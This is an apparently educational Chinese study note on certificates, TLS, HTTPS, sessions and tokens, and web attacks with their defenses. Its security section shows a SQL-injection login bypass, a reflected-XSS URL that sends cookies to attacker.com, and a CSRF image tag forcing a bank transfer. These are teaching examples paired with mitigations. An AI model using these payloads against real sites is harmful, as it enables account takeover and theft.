数字证书通常由一个受信任的第三方证书颁发机构（CA，Certificate Authority）颁发，CA会对证书持有人进行身份验证，并为其颁发数字证书。数字证书中包含了证书持有人的公钥，而私钥通常由证书持有人自己保存，用于进行数字签名和加密通信。

在数字证书的使用中，客户端和服务器之间的通信过程如下：

1. 服务器将自己的数字证书发送给客户端。

2. 客户端验证证书的真实性和有效性，如果证书是由一个受信任的CA签发的，并且证书中的信息与服务器身份相符，则客户端会信任该证书。

3. 客户端使用证书中包含的公钥对通信数据进行加密，以确保数据的保密性。

4. 服务器使用自己的私钥对加密数据进行解密，并使用自己的私钥对数字签名进行验证，以确保通信数据的完整性和真实性。

数字证书在互联网安全中发挥了重要的作用，可以用于保护网站的安全，防止中间人攻击、数据篡改等恶意行为。同时，数字证书也可以用于身份认证、数字签名等场景，确保数字数据的安全性和可信性。

## SSL/TLS

SSL（安全套接层）和TLS（传输层安全）的关系是发展演进关系。TLS是SSL的更新和改进版本。虽然二者经常一起提及，但目前主要使用的是TLS协议，因为它比SSL更安全、更先进。

TLS的工作原理：

1. 客户端使用非对称加密与服务器进行通信，实现身份验证并协商对称加密使用的密钥
2. 采用对称加密算法对信息摘要进行加密

这样，SSL/TLS协议在服务器和客户端之间的通信使用了混合加密方案，既能确保密钥的安全分发，又能保证数据加密的高效性

### TLS 握手有哪些步骤？

![TLS 握手](https://cf-assets.www.cloudflare.com/slt3lc6tev37/5aYOr5erfyNBq20X5djTco/3c859532c91f25d961b2884bf521c1eb/tls-ssl-handshake.png)

TLS 握手是由客户端和服务器交换的一系列数据报或消息。TLS 握手涉及多个步骤，因为客户端和服务器要交换完成握手和进行进一步对话所需的信息。

TLS 握手中的确切步骤将根据所使用的密钥交换算法的种类和双方支持的密码套件而有所不同。大致如下：

1. **“客户端问候（client hello）” 消息：** 客户端通过向服务器发送“问候”消息来开始握手。该消息将包含客户端支持的 TLS 版本，支持的密码套件（密码套件是一组用于建立安全通信连接的算法），以及称为一串称为“客户端随机数（client random）”的随机字节。
2. **“服务器问候（server hello）”消息：** 作为对 client hello 消息的回复，服务器发送一条消息，内含服务器的 [SSL 证书](https://www.cloudflare.com/learning/ssl/what-is-an-ssl-certificate/)（SSL证书是一种数字证书，是由数字证书颁发机构（CA）签发的数字证书的一种 ）、服务器选择的密码套件，以及“服务器随机数（server random）”，即由服务器生成的另一串随机字节。
3. **身份验证：** 客户端使用颁发该证书的证书颁发机构验证服务器的 SSL 证书。此举确认服务器是其声称的身份，且客户端正在与该域的实际所有者进行交互。
4. **预主密钥（是在SSL/TLS握手期间由客户端生成的随机密钥，用于协商会话密钥）：** 客户端再发送一串随机字节，即“预主密钥（premaster secret）”。预主密钥是使用公钥[公钥](https://www.cloudflare.com/learning/ssl/how-does-public-key-encryption-work/)（客户端从服务器的 SSL 证书中获得公钥）加密的，只能使用服务器的私钥解密。
5. **私钥被使用：**服务器对预主密钥进行解密。
6. **生成会话密钥：**客户端和服务器均使用客户端随机数、服务器随机数和预主密钥生成会话密钥。双方应得到相同的结果。
7. **客户端就绪：**客户端发送一条“已完成”消息，该消息用会话密钥加密。
8. **服务器就绪：**服务器发送一条“已完成”消息，该消息用会话密钥加密。
9. **实现安全对称加密：**已完成握手，并使用会话密钥继续进行通信。

### TLS 握手期间会发生什么？

在 TLS 握手过程中，客户端和服务器一同执行以下操作：

- 指定将要使用的 TLS 版本（如TLS 1.0、1.2、1.3 等）
- 决定将要使用哪些密码套件
- 通过服务器的公钥和 SSL 证书颁发机构的数字签名来验证服务器的身份
- 生成会话密钥，以在握手完成后使用对称加密

# HTTPS

HTTPS（超文本传输安全协议）是一种用于保护网络通信安全和数据传输完整性的协议。它在HTTP（超文本传输协议）的基础上添加了SSL/TLS加密层，为数据传输提供加密、身份验证和完整性保护。

## 主要作用

1. 加密通信：HTTPS通过SSL/TLS协议加密数据，确保数据在传输过程中不被未经授权的第三方窃取或篡改。
2. 身份验证：HTTPS使用数字证书对服务器进行身份验证，防止用户连接到伪造的服务器，降低中间人攻击的风险。
3. 数据完整性：HTTPS确保数据在传输过程中不会被篡改，从而保证了数据的完整性。

## 工作原理

1. 用户在浏览器中输入HTTPS网址并发送请求。
2. 服务器收到请求后返回其数字证书，包括公钥和证书颁发机构（CA）的签名等信息。
3. 浏览器验证服务器证书的有效性，包括证书的颁发者、有效期等。
4. 若验证通过，浏览器使用服务器的公钥加密一个随机生成的会话密钥，并将其发送给服务器。
5. 服务器使用自己的私钥解密会话密钥，然后使用会话密钥对数据进行加密传输。
6. 浏览器使用会话密钥对接收到的加密数据进行解密，展示网页内容。

# Session、Cookie、Token

## Session

Session 是服务器端用来跟踪和维护用户状态的技术。服务器为每个用户创建一个唯一的 Session ID，并将其与用户的会话数据关联。Session ID 通常通过 Cookie、URL 参数或隐藏表单字段的方式传递给客户端。Session 主要用于识别用户身份、存储用户信息等场景。

`HttpSession` 对象并不是 `HttpServletRequest` 自带的，但可以通过 `HttpServletRequest` 对象的 `getSession` 方法轻松获取。当调用 `request.getSession()` 时，如果当前请求没有关联的会话，它会自动为您创建一个新的会话。如果只想在已经存在的会话中获取，而不创建新的会话，可以调用 `request.getSession(false)`。这样，如果没有关联的会话，它将返回 `null`。

## Cookie

Cookie 是一种存储在客户端（如浏览器）的小型文本文件，用于保存服务器发送给客户端的信息。服务器可以设置、读取和修改 Cookie 以识别和追踪用户。Cookie 可以存储一些简单的数据，如用户 ID、登录状态等。

`Cookie` 对象不是 `HttpServletRequest` 自带的，但可以通过 `HttpServletRequest` 对象的 `getCookies` 方法轻松获取。这个方法会返回一个 `Cookie` 数组，其中包含客户端发送给服务器的所有 Cookie。若客户端没有发送任何 Cookie，这个方法将返回 `null`。

## Session和Cookie的区别

1. 存储位置不同：Session 存储在服务器端，依赖于 Cookie 或其他方式传递 Session ID；Cookie 存储在客户端；
2. 存储的数据类型不同：Session能够存储任意的JAVA对象，Cookie只能存储String类型的对象。  

## Token

### 定义

Token又称“令牌”，Token是服务端生成的一串字符串，用于身份验证，当第一次登录后，服务器生成一个Token并将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据，服务器就可以根据Token信息验证客户端的身份并确定其访问权限。

### 引入目的

Token（令牌）的引入是为了解决一些基于传统 Session 和 Cookie 机制的安全性和可扩展性问题。Token 的设计思路是为了在客户端和服务器之间建立一种无状态、可靠的身份验证机制。引入 Token 的原因主要包括以下几点：

1. 分布式系统和微服务：在分布式系统和微服务架构中，多个不同的服务器可能需要处理同一个客户端的请求。这种情况下，使用基于服务器的会话管理（如 Session + Cookie）可能导致不一致的状态。Token 提供了一种无状态的解决方案，可以在不同的服务器间共享和验证，从而更适合分布式和微服务环境。

2. 安全性：Token 可以提供更好的安全性。相对于传统的 Cookie 机制，Token 可以降低 CSRF（跨站请求伪造）攻击的风险。此外，Token 可以包含签名或加密，以确保数据的完整性和安全性。例如，JWT（JSON Web Token）就是一种常见的 Token 实现方式，它支持签名和加密。

3. 跨域访问：Token 可以更轻松地支持跨域访问。在基于 Token 的身份验证中，客户端可以将 Token 放在请求头（如 `Authorization` 头）中，从而避免浏览器的 Cookie 跨域限制。

4. 多设备和多平台支持：Token 可以灵活地应用于不同的客户端设备和平台。由于 Token 可以通过请求头、URL 参数或请求体等多种方式传输，它可以轻松地在 Web、移动设备和桌面应用等多种场景下使用。

5. 易于集成：Token 机制通常易于与第三方服务集成，如 OAuth2 和 OpenID Connect 等身份验证协议。这些协议允许用户使用第三方帐户（如 Google、Facebook 或 GitHub）登录应用，而无需创建新的帐户。

总之，Token 引入主要是为了解决传统基于 Session 和 Cookie 的身份验证机制在安全性、可扩展性和跨平台支持方面的挑战。Token 为构建无状态、可扩展且安全的身份验证解决方案提供了一种有效的方法。

### Token 可以降低 CSRF（跨站请求伪造）攻击的风险的原理

要达到在使用Token后降低 CSRF攻击风险的目的，可以将Token放到请求头，（如 `Authorization` 头）中，攻击者在跨站请求中很难修改请求头，并且浏览器不会像处理 Cookie 那样自动将其发送到服务端，需要在编写客户端代码时，手动获取 Token 并将其添加到请求头中，这就阻止了攻击者将 Token 附加到恶意请求中。这种显式发送 Token 的方式有助于降低 CSRF 攻击的风险。

将 Token 存储在 Cookie 里面并不能降低 CSRF 风险，这样做会使应用面临与传统基于 Cookie 的身份验证相同的 CSRF 攻击风险。

对于存储在客户端代码的某个存储位置（如 LocalStorage、SessionStorage 或内存，非cookie）的 Token，要求开发者在编写客户端代码时，手动获取 Token 并将其添加到请求头中。例如：

```javascript
fetch('https://example.com/api/resource', {
  headers: {
    'Authorization': 'Bearer ' + token
  }
})
```

### JWT

JWT（JSON Web Token）是一种用于身份验证和授权的开放标准（RFC 7519），它定义了一种紧凑、自包含的 Token 结构。JWT 使用 JSON 对象表示一组声明（Claim），并将其进行 Base64Url 编码和签名或加密，以确保数据的完整性和安全性。JWT 由三部分组成：头部（Header）、载荷（Payload）和签名（Signature）。

Token 和 JWT 的关系是：JWT 是 Token 的一种实现方式。Token 是一种更通用的概念，可以有多种实现方式和数据格式。JWT 是一种具体的 Token 实现，它使用 JSON 对象表示 Token 的内容，并通过 Base64Url 编码和签名或加密来确保数据的完整性和安全性。由于 JWT 的紧凑和自包含特性，它在许多场景下被广泛使用，如身份验证、授权和单点登录（SSO）等。

- JSON Web Token（JWT）是一种轻量级的身份验证和授权机制，它使用JSON格式对信息进行编码，以实现安全传输和存储。JWT通常用于Web应用程序中，用于在客户端和服务器之间传递安全的身份认证信息和其他数据。

- JWT由三部分组成：头部（Header）、载荷（Payload）和签名（Signature）。头部包含有关令牌类型和加密算法的信息；载荷包含有关用户和其他授权信息的信息；签名用于验证令牌的真实性和完整性。

- 在使用JWT进行身份验证时，服务器通常会在成功验证用户凭据后生成JWT，然后将其发送给客户端。客户端可以在每次请求时将JWT发送回服务器进行身份验证。服务器会验证JWT的签名，并解码载荷中的信息，以确认用户的身份和其他授权信息。

- JWT具有以下优点：
  - 轻量级：JWT使用JSON格式进行编码，可以在客户端和服务器之间轻松传输和存储，而不需要使用复杂的数据格式和协议。

  - 自包含性：JWT包含了所有必要的信息，例如用户身份和其他授权信息，使得在客户端和服务器之间进行身份验证和授权变得非常简单。

  - 可扩展性：JWT的载荷可以包含任意的信息，例如用户ID、角色、权限等信息，以满足不同的应用需求。

  - 安全性：JWT使用签名对令牌进行验证和保护，防止令牌被篡改和伪造。
- 总之，JWT是一种简单而安全的身份验证和授权机制，可以用于Web应用程序中，以确保用户身份的安全性和可信性。

# Web安全

## SQL注入

SQL注入（SQL Injection）是一种常见的网络安全漏洞，攻击者通过在用户输入中注入恶意的 SQL 代码，从而操纵后端数据库，获取未授权的数据访问、修改数据、执行管理操作甚至执行任意代码。这种攻击方式通常是由于对用户输入的不充分验证和处理导致的。

以下是一个简单的 SQL 注入攻击示例。假设我们有一个基于用户输入的用户名和密码来验证用户身份的 Web 应用。在不考虑 SQL 注入的情况下，登录查询可能如下：

```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password';
```

在这里，`$username` 和 `$password` 是从用户输入中获取的。攻击者可以在用户名或密码字段中输入恶意 SQL 代码，例如在用户名字段中输入：`admin' --`。这会导致生成以下查询：

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '';
```

在这个例子中，`--` 是 SQL 中的注释符号，从而使得密码验证部分被注释掉，攻击者可以绕过密码验证，成功登录管理员账户。

为了防止 SQL 注入攻击，可以采取以下措施：

1. 参数化查询：使用参数化查询（也称为预编译语句或绑定变量）来与数据库交互，而不是直接在 SQL 语句中拼接用户输入。在SQL语句中，变量用?表示，攻击者就无法改变SQL的结构。参数化查询会将用户输入作为参数传递给查询，而不是作为查询的一部分，从而避免 SQL 注入。
2. 输入验证：对用户输入进行严格的验证，限制允许的字符集和格式。例如，可以限制用户名和密码只包含字母和数字。
3. 使用存储过程：将 SQL 代码封装在数据库中的存储过程中，并通过参数调用这些过程。这样可以确保 SQL 代码不受用户输入的影响。
4. 最小权限原则：限制应用程序连接数据库的权限，使其只能访问必要的数据和执行必要的操作，避免使用root等高级权限账户直接连接数据库。这样即使攻击者发起了 SQL 注入攻击，对数据库的潜在破坏也会受到限制。
5. 数据库错误处理：不要向用户显示详细的数据库错误信息，因为这可能为攻击者提供有关数据库结构和配置的敏感信息。应该将详细的错误信息记录在日志中，并向用户显示简洁的错误消息。

## 跨站脚本攻击（XSS攻击）

跨站脚本攻击（Cross-Site Scripting，简称 XSS）是一种常见的网络安全漏洞，攻击者通过在 Web 应用中注入恶意的脚本（通常为 JavaScript），以受害者身份在其浏览器上执行这些脚本。这种攻击方式通常是由于对用户输入的不充分验证和处理导致的。

XSS 攻击主要分为三类：

1. 反射型 XSS：恶意脚本通过 URL 参数传递，当用户点击含有恶意链接的网站或邮件时，攻击者的脚本随请求发送到服务器。攻击者可以构造一个恶意链接，将包含恶意脚本的关键词作为 URL 参数传递：

   ```php
   https://example.com/search?search=<script>document.location='https://attacker.com/steal?cookie='+encodeURIComponent(document.cookie);</script>
   ```

   当受害者点击这个恶意链接时，恶意脚本会作为参数发送到服务器，然后服务器将脚本嵌入到响应页面中。最后，当受害者浏览器加载页面时，恶意脚本被执行。在这个例子中，恶意脚本将受害者的 Cookie 信息发送到攻击者控制的网站。

2. 存储型 XSS：恶意脚本被存储在服务器上，当受害者访问包含恶意脚本的页面时，脚本被加载并执行。比如，黑客写下一篇含有恶意代码的博客文章，所有访问该博客文章的用户都会在他们的浏览器中执行这段恶意的代码，就会把恶意的脚本保存到服务端。

3. DOM 型 XSS：这类攻击不涉及服务器，而是在客户端通过操纵 DOM（文档对象模型）实现。攻击者在 URL 参数或其他输入途径中注入恶意脚本，然后通过客户端 JavaScript 代码将脚本插入到 DOM 中并执行。

XSS 攻击可能导致以下危害：

- 窃取用户敏感信息（如 Cookie、会话令牌等）
- 模拟用户行为
- 利用受害者的身份执行恶意操作
- 向受害者展示虚假信息

为了防止 XSS 攻击，可以采取以下措施：

1. 输入验证：对用户输入进行严格的验证，限制允许的字符集和格式。

2. 输出编码：在将用户输入插入到 HTML 页面中之前，对其进行适当的编码，以防止恶意脚本被解释执行。例如，将尖括号 `<` 和 `>` 转换为 HTML 实体 `&lt;` 和 `&gt;`。

3. 使用内容安全策略（CSP）：CSP 是一种安全特性，可以限制浏览器加载和执行外部资源（如脚本、样式表等）。通过配置 CSP，可以限制脚本来源、禁止内联脚本执行等，从而降低 XSS 攻击的风险。

4. 使用 HttpOnly Cookie：将敏感信息（如会话令牌）存储在 HttpOnly Cookie 中，这样 JavaScript 无法访问这些 Cookie，即使发生 XSS 攻击，攻击者也无法窃取这些敏感信息。

5. 保持软件更新：及时更新 Web 应用程序及其依赖库，以修复可能存在的安全漏

## 跨站请求伪造攻击（CSRF攻击）

跨站请求伪造（Cross-Site Request Forgery，简称 CSRF）是一种网络安全漏洞，攻击者利用受害者的登录状态，在受害者不知情的情况下伪造请求，让受害者执行攻击者指定的操作。这种攻击方式通常利用用户在其他网站的登录状态，以及浏览器自动发送 Cookie 的特性。

以下是一个简单的 CSRF 攻击示例。假设我们有一个银行网站，用户在登录后可以进行转账操作。转账请求可能如下：

```
https://bank.example.com/transfer?to=account&amount=100
```

在这里，`to` 参数表示收款人账户，`amount` 参数表示转账金额。正常情况下，用户登录银行网站后，通过填写表单发起转账请求。

攻击者可以构造一个恶意网站或电子邮件，包含一个自动发起转账请求的图像标签：

```html
<img src="https://bank.example.com/transfer?to=attacker_account&amount=1000" width="0" height="0" />
```

当受害者访问恶意网站或查看恶意邮件时，浏览器会自动加载图像，从而发起转账请求。如果受害者同时处于银行网站的登录状态，由于浏览器会自动发送 Cookie，转账请求会被银行网站视为合法操作并执行。

为了防止 CSRF 攻击，可以采取以下措施：

1. 使用安全令牌：为每个会话或表单生成一个随机的安全令牌，将其嵌入到表单或请求中。服务器需要验证表单中的令牌与请求信息中（如Session或Cookie）的令牌是否匹配，以确保请求来自合法用户。

2. SameSite Cookie：将 Cookie 的 SameSite 属性设置为 `Strict` 或 `Lax`，以防止跨站请求发送 Cookie。这样，即使攻击者发起 CSRF 攻击，请求也不会附带有效的 Cookie，从而阻止攻击。

3. 验证请求来源：检查请求的来源（如 `Referer` 和 `Origin` 头），确保请求来自可信的网站。这可以防止跨站请求，但可能受到某些限制（如代理和浏览器设置）。

4. 双重验证：对于敏感操作（如转账、密码修改等），使用双重验证（如短信验证码、邮件确认等）确保用户确实想要执行该操作。

5. 使用自定义请求头：为 AJAX 请求添加自定义请求头，例如 CSRF-Token，因为跨站请求通常无法修改请求头。在服务器端，验证请求头中的 CSRF-Token 是否有效。

## 点击劫持攻击

点击劫持攻击是一种网络安全漏洞，攻击者通过在受害者浏览器中重叠不透明或透明的 Web 页面层，诱导受害者在不知情的情况下点击或与被遮盖的原始页面上的元素进行交互。这种攻击通常利用 HTML 和 CSS 技术实现，并可能导致用户泄露敏感信息或执行不安全操作。

为了防止点击劫持攻击，可以采取以下措施：

1. frame busting：通常可以写一段JavaScript代码，以禁止iframe的嵌套，这种方法叫frame busting

   ```javascript
   if (top.location != location) {
   	top.location = self.location;
   }
   ```

2. 使用 X-Frame-Options 响应头：frame busting存在被绕过的可能，比较好的方案是使用一个HTTP头，X-Frame-Options，服务器可以发送 X-Frame-Options 响应头来指示浏览器不允许将网站嵌入到 iframe 中。这将阻止攻击者使用 iframe 构建点击劫持攻击。例如，设置 `X-Frame-Options: DENY` 将完全禁止嵌入。

## 拒绝服务攻击（DDoS 攻击）

拒绝服务攻击（Denial of Service, 简称 DoS）是一种网络安全攻击，其目的是让目标系统或网络资源无法正常提供服务。分布式拒绝服务攻击（Distributed Denial of Service, 简称 DDoS）是 DoS 攻击的一种，它利用大量分布在不同位置的攻击者（通常是通过僵尸网络）同时向目标发起攻击，从而更有效地干扰目标系统的正常运行。

DDoS 攻击有多种类型，主要分为以下三类：

1. 网络层攻击：这类攻击主要针对网络基础设施，例如通过 ICMP 洪水攻击，来消耗目标的网络带宽资源，导致正常用户无法访问。

   防御措施：

   - 增加网络带宽：提升网络带宽可以缓解网络层攻击带来的影响。
   - 配置防火墙规则：限制 ICMP、UDP 流量，减少恶意流量进入网络。
   - 采用流量清洗服务：使用第三方 DDoS 防护服务，如 Cloudflare、AWS Shield、Akamai 等，以帮助检测和过滤攻击流量。

2. 传输层攻击：这类攻击主要针对目标系统的传输层协议，例如通过 SYN 洪水攻击（发送大量未完成的 TCP 连接请求）、UDP 洪水攻击来消耗目标系统的连接资源，使其无法处理正常用户的连接请求。

   防御措施：

   - 配置防火墙规则：限制 SYN 数据包的速率，防止攻击者发送大量未完成的连接请求；限制 UDP 流量，减少恶意流量进入网络。
   - 使用 SYN Cookies：在不需要分配额外资源的情况下，对 SYN 数据包进行验证。
   - 启用连接限制：限制每个 IP 地址可建立的连接数，降低攻击影响。

3. 应用层攻击：这类攻击针对目标系统的应用层服务，例如通过 HTTP 洪水攻击（发送大量伪造的 HTTP 请求）来消耗目标系统的计算资源，导致正常用户无法访问。

   防御措施：

   - 启用 Web 应用防火墙（WAF）：监控和过滤应用层恶意请求。
   - 使用内容分发网络（CDN）：通过分布式服务器缓存和提供网站内容，抵抗应用层攻击。
   - 限制请求速率：对来自单个 IP 地址的请求速率进行限制，防止攻击者发送大量请求。
   - 使用负载均衡：在多个服务器之间分配流量，分散攻击负载。

综合防御措施：

- 网络分层和隔离：实施分层和隔离策略，限制攻击者对关键资源的访问。
- 使用安全配置和补丁：保持系统和软件的安全配置，及时应用安全补丁，以减少潜在的漏洞。
- 监控和应急计划：持续监控网络流量和系统性能，制定应急计划以应对 DDoS 攻击。

## 防火墙和入侵防御系统

防火墙主要负责阻止或允许网络流量通过，基于预先定义的规则集来对传入和传出流量进行过滤。防火墙的主要目的是在内部网络和外部网络之间建立安全边界。

入侵检测系统（IDS）则主要用于监控网络流量，以检测潜在的恶意活动。IDS 会根据特征库、异常行为等来识别攻击行为，主要目的是检测潜在的恶意行为，并在检测到时发出警报。

防火墙和 IDS 之间的关键区别在于，防火墙主要用于过滤网络流量，而 IDS 主要用于监控网络流量并检测异常行为。
